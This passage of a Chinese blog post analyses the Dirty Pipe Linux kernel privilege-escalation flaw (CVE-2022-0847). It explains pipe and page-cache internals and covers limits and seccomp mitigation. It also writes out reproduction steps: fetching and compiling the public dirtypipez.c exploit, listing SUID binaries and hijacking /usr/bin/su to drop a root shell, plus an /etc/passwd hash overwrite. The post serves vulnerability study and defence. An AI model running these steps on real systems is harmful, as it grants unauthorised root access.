<li>改为自己的密码hash，如：<code>openssl passwd -1  corp0ra1</code> ，产生秘钥为<code>$1$ZpSBXa3N$LGLE2TKYoc2GVFFP3.jC80</code></li>
</ol>
</li>
<li>疑问：/etc/passwd文件的第二行就乱了啊，这种乱的东西系统读的时候不会产生bug吗？？<ol>
<li>搜了半天，暂时没搜到相关资料。</li>
<li>但是既不影响root的登录，也不影响后续账户的登录，留个坑吧</li>
</ol>
</li>
</ol>
<p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2014.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="dirtypipez-c"><a href="#dirtypipez-c" class="headerlink" title="dirtypipez.c"></a><a target="_blank" rel="noopener" href="https://haxx.in/files/dirtypipez.c">dirtypipez.c</a></h2><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp">mkdir dirtypipez<br>cd dirtypipez<br>wget https:<span class="hljs-comment">//haxx.in/files/dirtypipez.c</span><br>gcc dirtypipez.c -o dirtypipez<br><span class="hljs-comment">//先找到一个具有 SUID 权限的可执行文件</span><br>find / -perm -u=s -type f <span class="hljs-number">2</span>&gt;/dev/null<br><span class="hljs-comment">//执行其中任意一个具有 SUID 权限的文件，如/bin/su</span><br>./dirtypipez /usr/bin/su<br></code></pre></td></tr></table></figure>

<p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2015.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="原理探索"><a href="#原理探索" class="headerlink" title="原理探索"></a>原理探索</h3><blockquote>
<p>此次接触这类提权方式，故深入探索</p>
</blockquote>
<p>操作：直接修改一个具有suid权限的可执行文件，然后执行这个可执行文件提权，完成提权后再把文件改回来</p>
<ol>
<li>hijacking suid binary：将恶意代码写入具备root权限的SUID程序</li>
<li>dropping suid shell：执行被篡改后的程序<ol>
<li>运行此程序时可获取root 权限:以root的身份将提权代码写入/tmp/sh，并设置其可执行权限为<code>4755</code> <img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2016.png" srcset="/img/loading.gif" lazyload></li>
</ol>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br>fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/sh&quot;</span>, O_WRONLY | O_CREAT | O_TRUNC);<br><span class="hljs-built_in">write</span>(fd, elfcode, elfcode_len)<br><span class="hljs-built_in">chmod</span>(<span class="hljs-string">&quot;/tmp/sh&quot;</span>, <span class="hljs-number">04755</span>)<br><span class="hljs-built_in">close</span>(fd);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure>
</li>
<li>restoring suid binary：恢复被篡改文件为原样</li>
<li>popping root shell ：获取shell<ol>
<li>执行/tmp/sh文件 ，具有<code>4755</code>权限的/tmp/sh执行效果可参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Shad0wpf/article/details/103488853">Linux下普通用户使用强制位获取root权限</a></li>
</ol>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">/tmp/sh文件内容：<br><span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">setgid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">execve</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>, [<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-literal">NULL</span>], [<span class="hljs-literal">NULL</span>]);<br></code></pre></td></tr></table></figure>
</li>
</ol>
<p>补充：</p>
<ol>
<li>为什么要找具备root权限的SUID程序：SUID可以让程序调用者以文件拥有者的身份运行该文件，当我们以一个普通用户去运行一个root用户所有的SUID文件，那么运行该文件我们就可以获取到root权限，虽然SUID权限只在该程序执行过程中有效。</li>
<li>如何寻找具备root权限的SUID程序：如<code>find / -perm -u=s -type f 2&gt;/dev/null</code>(不同系统适用于不同的命令)</li>
</ol>
<h3 id="shellcode探索"><a href="#shellcode探索" class="headerlink" title="shellcode探索"></a>shellcode探索</h3><blockquote>
<p>其实作者备注给了shellcode，但是之前一直只是用别人的shellcode，或者自动化生成shellcode，其实并不能看懂shellcode，以及背后hex编码的含义，借此机会初步探一探而已。本质上是废话内容</p>
</blockquote>
<p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2017.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="补充内容"><a href="#补充内容" class="headerlink" title="补充内容"></a>补充内容</h1><h2 id="作者文章提及的POC限制"><a href="#作者文章提及的POC限制" class="headerlink" title="作者文章提及的POC限制"></a>作者文章提及的POC限制</h2><ol>
<li>为什么要读的权限？因为要调用<code>splice()</code>，而<code>splice()</code>需要读的权限</li>
<li>为什么必须读一个字节？因为要使用<code>splice()</code>读入一个byte到pipe中 ，进而完成文件对应的 page与 <code>pipe_buffer</code> 的 <code>page</code> 字段的关联</li>
<li>为什么写的空间不能超过page限制？因为有判断<code>offset + chars &lt;= PAGE_SIZE</code>，超过则不让续写，会往<code>pipe-&gt;tmp_page</code>去写，就不会写到目标文件中。</li>
<li>为什么文件不能被改写大小？<ol>
<li>作者的解释：因为管道有自己的页面填充管理，不会告诉页面缓存追加了多少数据</li>
<li>我的理解：文件有自己的一套管理系统，记录自己的文件大小。而此处只是对缓存界面中改写</li>
<li>ghost461@知道创宇404实验室<strong>：*①</strong>做的实验提及：poc_p2写入的是tmpFile文件的页面缓存, 所以无限的循环会因文件到尾而写入失败, 跳出循环。②由于需要写入的页面都是内核通过文件IO读取的page cache, 所以任意写入文件只能是单纯的“覆写”, 不能调整文件的大小*</li>
</ol>
</li>
</ol>
<h2 id="作者POC的一些问题"><a href="#作者POC的一些问题" class="headerlink" title="作者POC的一些问题"></a>作者POC的一些问题</h2><ol>
<li>作者的POC为什么要写完所有的buffer？<ol>
<li>写完的目的是确保每个pipe的flag都设置了，确保splice绑定的pipe_buf的flag都设置了，不然存在一定的偶然性，即flag没设置好，进而导致后续续写失败</li>
</ol>
</li>
<li>作者POC为什么写一个页帧的大小？从 <code>pipe_write()</code> 函数可知，如果写入数据的大小为页帧大小的整数倍时，<code>chars</code> 的值总为零，此时写入不会进入 <code>if (chars &amp;&amp; !was_empty)</code> 这个分支。同时创建 pipe 的时候没有指定 <code>O_DIRECT</code> 标志，因此在 for 循环中会将每个 <code>pipe_buffer</code> 的标志位设置为 <code>PIPE_BUF_FLAG_CAN_MERGE</code>。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* fill the pipe completely; each pipe_buffer will now have  the PIPE_BUF_FLAG_CAN_MERGE flag */</span><br>	<span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br>		<span class="hljs-keyword">unsigned</span> n = r &gt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) ? <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) : r;<br>		<span class="hljs-built_in">write</span>(p[<span class="hljs-number">1</span>], buffer, n);<br>		r -= n;<br>	&#125;<br></code></pre></td></tr></table></figure>
</li>
<li>为什么作者POC要排干所有的pipe_buffer？<ol>
<li>能不能不排空？不行，因为进行merge之前有个判断if (chars &amp;&amp; !was_empty) ，而was_empty = pipe_empty(head, pipe-&gt;tail);，如果pipe满的话，则无法merge</li>
<li>能不能只排空一个？不行。因为之前<code>splice</code>函数调用<code>copy_page_to_iter_pipe</code>函数读入一个字节之后就占用了一个pipe_buffer，此时还是pipe_buffer满的。</li>
<li>能不能只排空两个？理论上应该可以？emmm没有深究了<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* drain the pipe, freeing all pipe_buffer instances (but leaving the flags initialized) */</span><br>	<span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br>		<span class="hljs-keyword">unsigned</span> n = r &gt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) ? <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) : r;<br>		<span class="hljs-built_in">read</span>(p[<span class="hljs-number">0</span>], buffer, n);<br>		r -= n;<br>	&#125;<br></code></pre></td></tr></table></figure></li>
</ol>
</li>
<li>为什么调用完<code>splice()</code>在调用<code>write()</code>操作，可以使得两次写入同一个pipe_buf中？指针怎么调整的？<ol>
<li><code>splice()</code>调用<code>copy_page_to_iter_pipe()</code> 时，将待写入的文件的 page 与 pipe_buffer 的 <code>page</code> 字段关联之后，然后将 <code>pipe_inode_info</code> 实例的 <code>head</code> 值增加了 1，指向新的pipe_buffer <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//https://github.com/torvalds/linux/blob/f6dd975583bd8ce088400648fd9819e4691c8958/lib/iov_iter.c#L367</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">size_t</span> <span class="hljs-title">copy_page_to_iter_pipe</span><span class="hljs-params">(struct page *page, <span class="hljs-keyword">size_t</span> offset, <span class="hljs-keyword">size_t</span> bytes,struct iov_iter *i)</span></span>&#123;<br>	…… ……<br>	buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br>	<span class="hljs-built_in">get_page</span>(page);<br>	buf-&gt;page = page;<br>	buf-&gt;offset = offset;<br>	buf-&gt;len = bytes;<br><br>	pipe-&gt;head = i_head + <span class="hljs-number">1</span>;<span class="hljs-comment">//此时本来指向下一个pipe_buffer的</span><br>	i-&gt;iov_offset = offset + bytes;<br>	i-&gt;head = i_head;<br>  …… ……<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><code>write()</code>操作调用 <code>pipe_write()</code> 之后，会进入 <code>if (chars &amp;&amp; !was_empty)</code> 分支。if 分支里获取 <code>pipe_buffer</code> 的时候将 <code>head</code> 值减 1，从而此时 <code>pipe_buffer</code> 的 page 指向的是文件的 page。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//https://github.com/torvalds/linux/blob/f6dd975583bd8ce088400648fd9819e4691c8958/fs/pipe.c#L403</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">ssize_t</span>   <span class="hljs-title">pipe_write</span><span class="hljs-params">(struct kiocb *iocb, struct iov_iter *from)</span></span>&#123;<br>	…… ……<br>	<span class="hljs-keyword">if</span> (chars &amp;&amp; !was_empty) &#123;<br>		<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="hljs-number">1</span>) &amp; mask];<span class="hljs-comment">//这里减去了1</span><br>		<span class="hljs-keyword">int</span> offset = buf-&gt;offset + buf-&gt;len;<br><br>		<span class="hljs-keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;offset + chars &lt;= PAGE_SIZE) &#123;<br>			ret = <span class="hljs-built_in">pipe_buf_confirm</span>(pipe, buf);<br>			<span class="hljs-keyword">if</span> (ret)<br>				<span class="hljs-keyword">goto</span> out;<br>			ret = <span class="hljs-built_in">copy_page_from_iter</span>(buf-&gt;page, offset, chars, from);<br>	…… ……<br>&#125;<br></code></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h2 id="漏洞的局限性"><a href="#漏洞的局限性" class="headerlink" title="漏洞的局限性"></a>漏洞的局限性</h2><p><strong>1．可供攻击的机器太少。</strong><br>由于存在漏洞的是5.8以上的内核，极少有公司生产环境更新的如此及时，而最新的内核已经修复了这个漏洞。因而，野外环境中很少有机器能够利用这个漏洞。如何您的内核版本正好包含该漏洞，更新到最新版本可以修复该漏洞。</p>
<p><strong>2．不能持久化。</strong><br>由于修改的是页面缓存，并未修改磁盘上的文件（有极小概率某个对文件有写权限的进程碰巧执行了读写操作，导致缓存被回写磁盘），虽然可以用于提权等操作，但是如果完成提权后不对被修改的文件重新进行持久化操作的话，当操作系统回收内存或者更简单的重启机器后，所做的修改都将失效。如：修改passwd文件去除掉root用户密码后，简单一个重启操作，root密码就恢复如初了。</p>
<p><strong>3．特殊文件限制。</strong><br>由于文件系统的特性，一些特殊文件不经过页面缓存，导致此漏洞对这类文件无效。</p>
<h2 id="漏洞的缓解措施"><a href="#漏洞的缓解措施" class="headerlink" title="漏洞的缓解措施"></a>漏洞的缓解措施</h2><p>如果无法升级或修补内核，您可以部署一个不允许系统调用的 seccomp 配置文件<code>splice</code>。虽然这可能会导致某些软件包出现问题，但阻止系统调用通常不会对合法应用程序产生影响，因为使用此系统调用的情况相对较少。</p>
<p>具体来说，为了保护 Docker 容器，可以修改 Docker 的<a target="_blank" rel="noopener" href="https://github.com/moby/moby/blob/master/profiles/seccomp/default.json">默认 seccomp 配置文件</a>并从允许的系统调用列表中删除 splice：</p>
<p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2018.png" srcset="/img/loading.gif" lazyload></p>
<p>创建自定义 seccomp 配置文件后，可以通过运行以下命令将其应用于新的 Docker 容器：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker run --security-opt seccomp=<span class="hljs-regexp">/path/</span>to<span class="hljs-regexp">/seccomp/</span>profile.json …<br></code></pre></td></tr></table></figure>

<blockquote>
<p>参考：<a target="_blank" rel="noopener" href="https://jfrog.com/blog/dirtypipe-cve-2022-0847-the-new-dirtycow/">https://jfrog.com/blog/dirtypipe-cve-2022-0847-the-new-dirtycow/</a></p>
</blockquote>
<h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><ol>
<li>这个漏洞的发现经历也非常有趣, 作者居然是从软件bug分析一路走到了内核漏洞披露, 相当佩服作者这种求索精神, 可以想象一个人在代码堆中翻阅各种实现细节时的辛酸, 也感谢作者如此详细的披露与分享。同时更重要的是追根溯源的探索的乐趣，我想这就是我为什么喜欢安全的原因之一</li>
<li>感慨本科所学的《计算机组成原理》，虽然当时看起来有点枯燥无用，但此时对于page,page cache,pipe这一块的知识或多或少能理解点</li>
<li>P牛是真卷啊，当然大家也都是，我只能慢慢跟上大家的步伐。</li>
<li>微博上部分评论<blockquote>
<p><a target="_blank" rel="noopener" href="https://weibo.com/u/1684840802">瘦肉丁</a>:认真的人应得的奖赏，经常说：“在你那儿崩溃了？在我这跑好好的啊”的人，可能永远无法有深度的收获。</p>
<p><a target="_blank" rel="noopener" href="https://weibo.com/u/2093018862">星先生cxm</a>:“排除一切不可能的，剩下的即使再不可能，那也是真相”帅啊</p>
</blockquote>
</li>
<li>有趣的发现：Linux 4.1 ：<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/5a81e6a171cdbd1fa8bc1fdd80c23d3d71816fac">commit d3d71816fac vfs: fix uninitialized flags in splice_to_pipe()</a> ：之前也存在<code>buf-&gt;flags</code>未初始化的问题</li>
</ol>
<h2 id="todo"><a href="#todo" class="headerlink" title="todo"></a>todo</h2><ol>
<li>没有用GDB来调试，只能硬看，等后期学pwn二进制的时候再折返</li>
<li>跟着git的操作，查看一下作者的分析历程：<a target="_blank" rel="noopener" href="http://blog.nsfocus.net/unix-11-git-2/">UNIX系列(11)–GIT源码查错技巧 -scz</a></li>
<li>容器逃逸<ol>
<li><strong><strong><a target="_blank" rel="noopener" href="https://www.datadoghq.com/blog/engineering/dirty-pipe-container-escape-poc/">Using the Dirty Pipe Vulnerability to Break Out from Containers</a></strong></strong></li>
<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1484/">Docker又爆出高危逃逸漏洞了？仔细研究下事情没那么简单</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/VMR_kLz1tAbHrequa2OnUA">从DirtyPipe到Docker逃逸</a></li>
</ol>
</li>
</ol>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>漏洞原理探究：</p>
<ol>
<li>漏洞发现者：<a target="_blank" rel="noopener" href="https://dirtypipe.cm4all.com/">The Dirty Pipe Vulnerability -by Max Kellermann</a> </li>
<li>ghost461@知道创宇404实验室：<a target="_blank" rel="noopener" href="https://paper.seebug.org/1843/">Linux 内核提权 DirtyPipe(CVE-2022-0847) 漏洞分析</a> ，从can_merge的引入分析漏洞成因。漏洞视角这部分参考之</li>
<li>未然实验室@华为安全：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/6VhWBOzJ7uu80nzFxe5jpg">未然公告丨Dirty Pipe - linux内核提权漏洞分析</a> ，从管道（pipe）实现机制和pipe_write()函数分析漏洞成因（pipe.c，以及作图参考之）</li>
<li>bigric3_@SilverNeedleLab：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/BtWRasj4xsiN_kmjULFrTw">DirtyPIPE漏洞分析从0到1</a>  ，从<em>Arinerron的POC的执行步骤</em>分析漏洞成因</li>
<li>Nitro@360GearTeam ：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/269886">Linux 内核 DirtyPipe 任意只读文件覆写漏洞（CVE-2022-0847）分析</a> 。函数调用分析很具体看是看不懂emm，但是漏洞复现和调试部分还是很精彩</li>
<li>ADLab@启明星辰:<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/RoGHvNW2Y6dZOjgsBVVm5Q">Linux内核权限提升漏洞“DirtyPipe”（CVE-2022-0847）分析</a> ，pipe和splice系统调用实现分析比较清楚，感觉一般</li>
<li>little_fish：<a target="_blank" rel="noopener" href="https://forum.huawei.com/enterprise/en/linux-dirty-pipe-vulnerability-cve-2022-0847/thread/836529-891">Linux Dirty Pipe Vulnerability (CVE-2022-0847)</a> ，将page cache和pipe时候通过画图挺好理解的</li>
</ol>
<p>漏洞复现：</p>
<ol>
<li>zjun:<a target="_blank" rel="noopener" href="https://blog.zjun.info/2022/cve-2022-0847.html">CVE-2022-0847 Dirty Pipe Linux 内核提权漏洞</a></li>
<li>P牛知识星球：《代码审计》</li>
</ol>
<blockquote>
<p>文章来源：通过sogo搜微信公众号文章+hacking8搜+google搜，历史文章一个个点开找</p>
</blockquote>

                            </div>
                            
                                <p class="note note-info">
                                    
                                                    本文最后更新于：
                                                        2022年6月7日 晚上
                                                            
                                </p>
                                
                                    <hr>
                                    <div>
                                        <div class="post-metas mb-3">
                                            
                                                <div class="post-meta mr-3">
                                                    <i class="iconfont icon-category"></i>
                                                    
                                                        <a class="hover-with-bg" href="/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/">
                                                            漏洞研究
                                                        </a>
                                                        
                                                </div>
                                                
                                                    
                                                        <div class="post-meta">
                                                            <i class="iconfont icon-tags"></i>
                                                            
                                                                <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
                                                                    漏洞复现
                                                                </a>
                                                                
                                                                <a class="hover-with-bg" href="/tags/CVE-2022-0847/">
                                                                    CVE-2022-0847
                                                                </a>
                                                                
                                                                <a class="hover-with-bg" href="/tags/Dirty-Pipe%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/">
                                                                    Dirty Pipe提权漏洞
                                                                </a>
                                                                
                                                                <a class="hover-with-bg" href="/tags/%E6%8A%80%E6%9C%AF%E6%8E%A2%E7%B4%A2/">
                                                                    技术探索
                                                                </a>
                                                                
                                                        </div>
                                                        
                                        </div>
                                        
                                            <p class="note note-warning">
                                                
                                                            本博客所有文章欢迎转载 ，但希望转载时能注明出处！ </br>关于文章，如有疑问，欢迎讨论！Email:corp0ra1@qq.com </br>如果图片无法显示:https://corp0ra1.github.io/common/imageLoad.html
                                                                
                                            </p>
                                            
                                                
                                                    <div class="post-prevnext">
                                                        <article class="post-prev col-6">
                                                            
                                                                
                                                        </article>
                                                        <article class="post-next col-6">
                                                            
                                                                
                                                                    <a href="/2022/03/15/The%20Dirty%20Pipe%20Vulnerability/">
                                                                        <span class="hidden-mobile">The Dirty Pipe Vulnerability[中文翻译]</span>
                                                                        <span class="visible-mobile">下一篇</span>
                                                                        <i class="iconfont icon-arrowright"></i>
                                                                    </a>
                                                                    
                                                        </article>
                                                    </div>
                                                    
                                    </div>

                                    
                        </article>
                    </div>
                </div>
            </div>
            
                <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
                    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

                </div>
                
        </div>
    </div>

    <!-- Custom -->
    
    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <div> <div class="copyright">©2020 - 2021 By Corp0ra1</div> </div> <div> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> &nbsp;|&nbsp; <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> &nbsp;|&nbsp; <a href="https://github.com/jsdelivr/jsdelivr" target="_blank" rel="nofollow noopener"><span>jsDelivr</span></a> </div> 
  </div>
  <!--添加运行时间-->
<div id="sitetime"></div>
<script language=javascript>
    function siteTime() {
        window.setTimeout("siteTime()", 1000);
        var seconds = 1000;
        var minutes = seconds * 60;
        var hours = minutes * 60;
        var days = hours * 24;
        var years = days * 365;
        var today = new Date();
        var todayYear = today.getFullYear();
        var todayMonth = today.getMonth() + 1;
        var todayDate = today.getDate();
        var todayHour = today.getHours();
        var todayMinute = today.getMinutes();
        var todaySecond = today.getSeconds();
        /* 
      Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
      year - 作为date对象的年份，为4位年份值
      month - 0-11之间的整数，做为date对象的月份
      day - 1-31之间的整数，做为date对象的天数
      hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
      minutes - 0-59之间的整数，做为date对象的分钟数
      seconds - 0-59之间的整数，做为date对象的秒数
      microseconds - 0-999之间的整数，做为date对象的毫秒数
     */
        var t1 = Date.UTC(2021, 05, 01, 00, 00, 00); //北京时间2018-2-13 00:00:00
        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
        var diff = t2 - t1;
        var diffYears = Math.floor(diff / years);
        var diffDays = Math.floor((diff / days) - diffYears * 365);
        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
        document.getElementById("sitetime").innerHTML = "很高兴遇到你，我已经在此等候了你 " + /*diffYears+" 年 "+*/ diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
    }
    siteTime();
</script>

    <div class="statistics">
        
            

                
                                                
                                                    <!-- 不蒜子统计PV -->
                                                    <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            
            <span id="busuanzi_value_site_pv"></span>
                                                     次
                                                        &nbsp; <span class="iconfont icon-love"></span></span>
                                                        

                                                            

                                                                <!-- 不蒜子统计UV -->
                                                                <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            
            <span id="busuanzi_value_site_uv"></span>
                                                                 人
                                                                    </span>
                                                                    
                                                                        
    </div>
    
  
  <!-- 备案信息 -->
  <div class="beian">
    <span>
      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
        鄂ICP备2021017863号
      </a>
    </span>
    
      
        <span>
          <a
            href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=2021017863"
            rel="nofollow noopener"
            class="beian-police"
            target="_blank"
          >
            
              <span style="visibility: hidden; width: 0">|</span>
              <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
            
            <span>鄂ICP备2021017863号</span>
          </a>
        </span>
      
    
  </div>


  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      $('#local-search-input').on('click', function() {
        searchFunc(path, 'local-search-input', 'local-search-result');
      });
      $('#modalSearch').on('shown.bs.modal', function() {
        $('#local-search-input').focus();
      });
    })()
  </script>












    
        <!-- Baidu Analytics -->
        <script defer>
            var _hmt = _hmt || [];
            (function() {
                var hm = document.createElement("script");
                hm.src = "https://hm.baidu.com/hm.js?a1a4ccab78dfa522556928ac810fa739";
                var s = document.getElementsByTagName("script")[0];
                s.parentNode.insertBefore(hm, s);
            })();
        </script>
        

            
                <!-- Google Analytics -->
                <!-- <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'G-4X9XV0H0D5', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src='https://www.google-analytics.com/analytics.js'></script> -->
                <!-- Global site tag (gtag.js) - Google Analytics -->
                <script async src="https://www.googletagmanager.com/gtag/js?G-4X9XV0H0D5"></script>
                <script>
                    window.dataLayer = window.dataLayer || [];

                    function gtag() {
                        dataLayer.push(arguments);
                    }
                    gtag('js', new Date());

                    gtag('config', 'G-4X9XV0H0D5');
                </script>
                

                    

                            

                                    

                                            
                                                    



<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
